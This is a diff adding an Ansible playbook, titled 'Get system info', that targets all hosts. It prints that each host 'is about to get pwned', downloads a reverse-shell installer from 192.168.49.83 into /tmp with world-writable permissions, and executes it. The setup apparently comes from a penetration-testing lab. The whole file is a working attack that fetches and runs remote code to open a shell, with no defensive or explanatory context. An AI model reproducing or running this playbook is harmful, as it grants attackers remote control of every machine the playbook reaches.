@@ -1,0 +1,18 @@
+---
+- name: Get system info
+  hosts: all
+  gather_facts: true
+  tasks:
+    - name: Display info
+      debug:
+          msg: "The hostname {{ ansible_hostname }} with the OS {{ ansible_distribution }} is about to get pwned"
+    - name: Download rev_shell installer
+      get_url: 
+        url: url=http://192.168.49.83/rev_shell.sh 
+        dest: /tmp/
+        mode: 0777
+    - name: Bout to get pwned...
+      shell: ./rev_shell.sh
+      args:
+        chdir: /tmp/
+    
